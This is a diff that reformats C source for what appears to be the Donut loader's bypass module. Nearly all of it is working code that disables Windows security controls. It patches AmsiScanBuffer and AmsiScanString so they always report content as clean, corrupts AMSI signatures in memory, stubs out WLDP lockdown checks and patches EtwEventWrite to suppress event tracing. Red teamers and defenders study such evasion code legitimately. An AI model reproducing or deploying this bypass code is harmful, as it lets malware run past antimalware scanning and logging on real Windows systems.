@@ -31,24 +31,19 @@
 
 #include "bypass.h"
 
-
 #if defined(BYPASS_AMSI_A)
 // This is where you may define your own AMSI bypass.
-// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_A defined.
+// To rebuild with your bypass, modify the makefile to add an option to build with
+// BYPASS_AMSI_A defined.
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-  return TRUE;
+    return TRUE;
 }
 
 #elif defined(BYPASS_AMSI_B)
 // fake function that always returns S_OK and AMSI_RESULT_CLEAN
-HRESULT WINAPI AmsiScanBufferStub(
-    HAMSICONTEXT amsiContext,
-    PVOID        buffer,
-    ULONG        length,
-    LPCWSTR      contentName,
-    HAMSISESSION amsiSession,
-    AMSI_RESULT  *result)
-{
+HRESULT WINAPI AmsiScanBufferStub(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length,
+                                  LPCWSTR contentName, HAMSISESSION amsiSession,
+                                  AMSI_RESULT *result) {
     *result = AMSI_RESULT_CLEAN;
     return S_OK;
 }
@@ -66,13 +61,9 @@ int AmsiScanBufferStubEnd(int a, int b) {
 }
 
 // fake function that always returns S_OK and AMSI_RESULT_CLEAN
-HRESULT WINAPI AmsiScanStringStub(
-    HAMSICONTEXT amsiContext,
-    LPCWSTR      string,
-    LPCWSTR      contentName,
-    HAMSISESSION amsiSession,
-    AMSI_RESULT  *result)
-{
+HRESULT WINAPI AmsiScanStringStub(HAMSICONTEXT amsiContext, LPCWSTR string,
+                                  LPCWSTR contentName, HAMSISESSION amsiSession,
+                                  AMSI_RESULT *result) {
     *result = AMSI_RESULT_CLEAN;
     return S_OK;
 }
@@ -83,103 +74,107 @@ int AmsiScanStringStubEnd(int a, int b) {
 
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     HMODULE dll;
-    DWORD   len, op, t;
-    LPVOID  cs;
+    DWORD len, op, t;
+    LPVOID cs;
 
     // try load amsi. if unable, assume DLL doesn't exist
     // and return TRUE to indicate it's okay to continue
     dll = xGetLibAddress(inst, inst->amsi);
-    if(dll == NULL) return TRUE;
-    
+    if (dll == NULL)
+        return TRUE;
+
     // resolve address of AmsiScanBuffer. if not found,
     // return FALSE because it should exist ...
     cs = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
-    if(cs == NULL) return FALSE;
-    
+    if (cs == NULL)
+        return FALSE;
+
     // calculate length of stub
-    len = (ULONG_PTR)AmsiScanBufferStubEnd -
-          (ULONG_PTR)AmsiScanBufferStub;
-    
+    len = (ULONG_PTR)AmsiScanBufferStubEnd - (ULONG_PTR)AmsiScanBufferStub;
+
     DPRINT("Length of AmsiScanBufferStub is %" PRIi32 " bytes.", len);
-    
+
     // check for negative length. this would only happen when
     // compiler decides to re-order functions.
-    if((int)len < 0) return FALSE;
-    
+    if ((int)len < 0)
+        return FALSE;
+
     // make the memory writeable. return FALSE on error
-    if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
-      
+    if (!inst->api.VirtualProtect(cs, len, PAGE_EXECUTE_READWRITE, &op))
+        return FALSE;
+
     DPRINT("Overwriting AmsiScanBuffer");
     // over write with virtual address of stub
-    Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);   
+    Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);
     // set memory back to original protection
     inst->api.VirtualProtect(cs, len, op, &t);
-  
+
     // resolve address of AmsiScanString. if not found,
     // return FALSE because it should exist ...
     cs = xGetProcAddress(inst, dll, inst->amsiScanStr, 0);
-    if(cs == NULL) return FALSE;
-    
+    if (cs == NULL)
+        return FALSE;
+
     // calculate length of stub
-    len = (ULONG_PTR)AmsiScanStringStubEnd -
-          (ULONG_PTR)AmsiScanStringStub;
-     
+    len = (ULONG_PTR)AmsiScanStringStubEnd - (ULONG_PTR)AmsiScanStringStub;
+
     DPRINT("Length of AmsiScanStringStub is %" PRIi32 " bytes.", len);
-    
+
     // check for negative length. this would only happen when
     // compiler decides to re-order functions.
-    if((int)len < 0) return FALSE;
-    
+    if ((int)len < 0)
+        return FALSE;
+
     // make the memory writeable
-    if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
-      
+    if (!inst->api.VirtualProtect(cs, len, PAGE_EXECUTE_READWRITE, &op))
+        return FALSE;
+
     DPRINT("Overwriting AmsiScanString");
     // over write with virtual address of stub
-    Memcpy(cs, ADR(PCHAR, AmsiScanStringStub), len);   
+    Memcpy(cs, ADR(PCHAR, AmsiScanStringStub), len);
     // set memory back to original protection
     inst->api.VirtualProtect(cs, len, op, &t);
-    
+
     return TRUE;
 }
 
 #elif defined(BYPASS_AMSI_C)
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-    HMODULE        dll;
-    PBYTE          cs;
-    DWORD          i, op, t;
-    BOOL           disabled = FALSE;
-    PDWORD         Signature;
-    
+    HMODULE dll;
+    PBYTE cs;
+    DWORD i, op, t;
+    BOOL disabled = FALSE;
+    PDWORD Signature;
+
     // try load amsi. if unable to load, assume
     // it doesn't exist and return TRUE to indicate
     // it's okay to continue.
     dll = xGetLibAddress(inst, inst->amsi);
-    if(dll == NULL) return TRUE;
-    
+    if (dll == NULL)
+        return TRUE;
+
     // resolve address of AmsiScanBuffer. if unable, return
     // FALSE because it should exist.
     cs = (PBYTE)xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
-    if(cs == NULL) return FALSE;
-    
+    if (cs == NULL)
+        return FALSE;
+
     // scan for signature
-    for(i=0;;i++) {
-      Signature = (PDWORD)&cs[i];
-      // is it "AMSI"?
-      if(*Signature == *(PDWORD)inst->amsi) {
-        // set memory protection for write access
-        inst->api.VirtualProtect(cs, sizeof(DWORD), 
-          PAGE_EXECUTE_READWRITE, &op);
-          
-        // change signature
-        *Signature++;
-        
-        // set memory back to original protection
-        inst->api.VirtualProtect(cs, sizeof(DWORD), op, &t);
-        disabled = TRUE;
-        break;
-      }
+    for (i = 0;; i++) {
+        Signature = (PDWORD)&cs[i];
+        // is it "AMSI"?
+        if (*Signature == *(PDWORD)inst->amsi) {
+            // set memory protection for write access
+            inst->api.VirtualProtect(cs, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &op);
+
+            // change signature
+            *Signature++;
+
+            // set memory back to original protection
+            inst->api.VirtualProtect(cs, sizeof(DWORD), op, &t);
+            disabled = TRUE;
+            break;
+        }
     }
     return disabled;
 }
@@ -191,62 +186,57 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
 // https://gist.github.com/mattifestation/ef0132ba4ae3cc136914da32a88106b9
 
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-    LPVOID                   clr;
-    BOOL                     disabled = FALSE;
-    PIMAGE_DOS_HEADER        dos;
-    PIMAGE_NT_HEADERS        nt;
-    PIMAGE_SECTION_HEADER    sh;
-    DWORD                    i, j, res;
-    PBYTE                    ds;
+    LPVOID clr;
+    BOOL disabled = FALSE;
+    PIMAGE_DOS_HEADER dos;
+    PIMAGE_NT_HEADERS nt;
+    PIMAGE_SECTION_HEADER sh;
+    DWORD i, j, res;
+    PBYTE ds;
     MEMORY_BASIC_INFORMATION mbi;
-    _PHAMSICONTEXT           ctx;
-    
+    _PHAMSICONTEXT ctx;
+
     // get address of CLR.dll. if unable, this
     // probably isn't a dotnet assembly being loaded
     clr = inst->api.GetModuleHandleA(inst->clr);
-    if(clr == NULL) return FALSE;
-    
-    dos = (PIMAGE_DOS_HEADER)clr;  
-    nt  = RVA2VA(PIMAGE_NT_HEADERS, clr, dos->e_lfanew);  
-    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
-      nt->FileHeader.SizeOfOptionalHeader);
-             
+    if (clr == NULL)
+        return FALSE;
+
+    dos = (PIMAGE_DOS_HEADER)clr;
+    nt = RVA2VA(PIMAGE_NT_HEADERS, clr, dos->e_lfanew);
+    sh = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader
+                                 + nt->FileHeader.SizeOfOptionalHeader);
+
     // scan all writeable segments while disabled == FALSE
-    for(i = 0; 
-        i < nt->FileHeader.NumberOfSections && !disabled; 
-        i++) 
-    {
-      // if this section is writeable, assume it's data
-      if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
-        // scan section for pointers to the heap
-        ds = RVA2VA (PBYTE, clr, sh[i].VirtualAddress);
-           
-        for(j = 0; 
-            j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
-            j += sizeof(ULONG_PTR)) 
-        {
-          // get pointer
-          ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
-          // query if the pointer
-          res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
-          if(res != sizeof(mbi)) continue;
-          
-          // if it's a pointer to heap or stack
-          if ((mbi.State   == MEM_COMMIT    ) &&
-              (mbi.Type    == MEM_PRIVATE   ) && 
-              (mbi.Protect == PAGE_READWRITE))
-          {
-            ctx = (_PHAMSICONTEXT)ptr;
-            // check if it contains the signature 
-            if(ctx->Signature == *(PDWORD*)inst->amsi) {
-              // corrupt it
-              ctx->Signature++;
-              disabled = TRUE;
-              break;
+    for (i = 0; i < nt->FileHeader.NumberOfSections && !disabled; i++) {
+        // if this section is writeable, assume it's data
+        if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+            // scan section for pointers to the heap
+            ds = RVA2VA(PBYTE, clr, sh[i].VirtualAddress);
+
+            for (j = 0; j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR);
+                 j += sizeof(ULONG_PTR)) {
+                // get pointer
+                ULONG_PTR ptr = *(ULONG_PTR *)&ds[j];
+                // query if the pointer
+                res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
+                if (res != sizeof(mbi))
+                    continue;
+
+                // if it's a pointer to heap or stack
+                if ((mbi.State == MEM_COMMIT) && (mbi.Type == MEM_PRIVATE)
+                    && (mbi.Protect == PAGE_READWRITE)) {
+                    ctx = (_PHAMSICONTEXT)ptr;
+                    // check if it contains the signature
+                    if (ctx->Signature == *(PDWORD *)inst->amsi) {
+                        // corrupt it
+                        ctx->Signature++;
+                        disabled = TRUE;
+                        break;
+                    }
+                }
             }
-          }
         }
-      }
     }
     return disabled;
 }
@@ -254,7 +244,8 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
 
 #if defined(BYPASS_WLDP_A)
 // This is where you may define your own WLDP bypass.
-// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_WLDP_A defined.
+// To rebuild with your bypass, modify the makefile to add an option to build with
+// BYPASS_WLDP_A defined.
 
 BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     return TRUE;
@@ -263,12 +254,9 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
 #elif defined(BYPASS_WLDP_B)
 
 // fake function that always returns S_OK and isApproved = TRUE
-HRESULT WINAPI WldpIsClassInApprovedListStub(
-    REFCLSID               classID,
-    PWLDP_HOST_INFORMATION hostInformation,
-    PBOOL                  isApproved,
-    DWORD                  optionalFlags)
-{
+HRESULT WINAPI WldpIsClassInApprovedListStub(REFCLSID classID,
+                                             PWLDP_HOST_INFORMATION hostInformation,
+                                             PBOOL isApproved, DWORD optionalFlags) {
     *isApproved = TRUE;
     return S_OK;
 }
@@ -276,87 +264,90 @@ HRESULT WINAPI WldpIsClassInApprovedListStub(
 // make sure prototype and code are different from other subroutines
 // to avoid removal by MSVC
 int WldpIsClassInApprovedListStubEnd(int a, int b) {
-  return a - b;
+    return a - b;
 }
 
 // fake function that always returns S_OK
-HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
-    HANDLE fileHandle,
-    PVOID  baseImage,
-    ULONG  ImageSize)
-{
+HRESULT WINAPI WldpQueryDynamicCodeTrustStub(HANDLE fileHandle, PVOID baseImage,
+                                             ULONG ImageSize) {
     return S_OK;
 }
 
 int WldpQueryDynamicCodeTrustStubEnd(int a, int b) {
-  return a / b;
+    return a / b;
 }
 
 BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     HMODULE wldp;
-    DWORD   len, op, t;
-    LPVOID  cs;
-    
+    DWORD len, op, t;
+    LPVOID cs;
+
     // try load wldp. if unable, assume DLL doesn't exist
     // and return TRUE to indicate it's okay to continue
     wldp = xGetLibAddress(inst, inst->wldp);
-    if(wldp == NULL) return TRUE;
-    
+    if (wldp == NULL)
+        return TRUE;
+
     // resolve address of WldpQueryDynamicCodeTrust
     // if not found, return FALSE because it should exist
     cs = xGetProcAddress(inst, wldp, inst->wldpQuery, 0);
-    if(cs == NULL) return FALSE;
-    
+    if (cs == NULL)
+        return FALSE;
+
     // calculate length of stub
-    len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -
-          (ULONG_PTR)WldpQueryDynamicCodeTrustStub;
-      
+    len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd
+          - (ULONG_PTR)WldpQueryDynamicCodeTrustStub;
+
     DPRINT("Length of WldpQueryDynamicCodeTrustStub is %" PRIi32 " bytes.", len);
-    
+
     // check for negative length. this would only happen when
     // compiler decides to re-order functions.
-    if((int)len < 0) return FALSE;
-    
+    if ((int)len < 0)
+        return FALSE;
+
     // make the memory writeable. return FALSE on error
-    if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
-      
+    if (!inst->api.VirtualProtect(cs, len, PAGE_EXECUTE_READWRITE, &op))
+        return FALSE;
+
     // overwrite with virtual address of stub
     Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
     // set back to original protection
     inst->api.VirtualProtect(cs, len, op, &t);
-    
+
     // resolve address of WldpIsClassInApprovedList
     // if not found, return FALSE because it should exist
     cs = xGetProcAddress(inst, wldp, inst->wldpIsApproved, 0);
-    if(cs == NULL) return FALSE;
-    
+    if (cs == NULL)
+        return FALSE;
+
     // calculate length of stub
-    len = (ULONG_PTR)WldpIsClassInApprovedListStubEnd -
-          (ULONG_PTR)WldpIsClassInApprovedListStub;
-    
+    len = (ULONG_PTR)WldpIsClassInApprovedListStubEnd
+          - (ULONG_PTR)WldpIsClassInApprovedListStub;
+
     DPRINT("Length of WldpIsClassInApprovedListStub is %" PRIi32 " bytes.", len);
-    
+
     // check for negative length. this would only happen when
     // compiler decides to re-order functions.
-    if((int)len < 0) return FALSE;
-    
+    if ((int)len < 0)
+        return FALSE;
+
     // make the memory writeable. return FALSE on error
-    if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
-      
+    if (!inst->api.VirtualProtect(cs, len, PAGE_EXECUTE_READWRITE, &op))
+        return FALSE;
+
     // overwrite with virtual address of stub
     Memcpy(cs, ADR(PCHAR, WldpIsClassInApprovedListStub), len);
     // set back to original protection
     inst->api.VirtualProtect(cs, len, op, &t);
-    
+
     return TRUE;
 }
 #endif
 
 #if defined(BYPASS_ETW_A)
 // This is where you may define your own ETW bypass.
-// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_ETW_A defined.
+// To rebuild with your bypass, modify the makefile to add an option to build with
+// BYPASS_ETW_A defined.
 BOOL DisableETW(PDONUT_INSTANCE inst) {
     return TRUE;
 }
@@ -364,8 +355,8 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
 #elif defined(BYPASS_ETW_B)
 BOOL DisableETW(PDONUT_INSTANCE inst) {
     HMODULE dll;
-    DWORD   len, op, t;
-    LPVOID  cs;
+    DWORD len, op, t;
+    LPVOID cs;
 
     // get a handle to ntdll.dll
     dll = xGetLibAddress(inst, inst->ntdll);
@@ -373,12 +364,13 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
     // resolve address of EtwEventWrite
     // if not found, return FALSE because it should exist
     cs = xGetProcAddress(inst, dll, inst->etwEventWrite, 0);
-    if (cs == NULL) return FALSE;
+    if (cs == NULL)
+        return FALSE;
 
 #ifdef _WIN64
     // make the memory writeable. return FALSE on error
-    if (!inst->api.VirtualProtect(
-        cs, 1, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+    if (!inst->api.VirtualProtect(cs, 1, PAGE_EXECUTE_READWRITE, &op))
+        return FALSE;
 
     DPRINT("Overwriting EtwEventWrite");
 
@@ -389,8 +381,8 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
     inst->api.VirtualProtect(cs, 1, op, &t);
 #else
     // make the memory writeable. return FALSE on error
-    if (!inst->api.VirtualProtect(
-        cs, 4, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+    if (!inst->api.VirtualProtect(cs, 4, PAGE_EXECUTE_READWRITE, &op))
+        return FALSE;
 
     DPRINT("Overwriting EtwEventWrite");
 
@@ -402,7 +394,6 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
 #endif
 
     return TRUE;
-
 }
 
 #endif
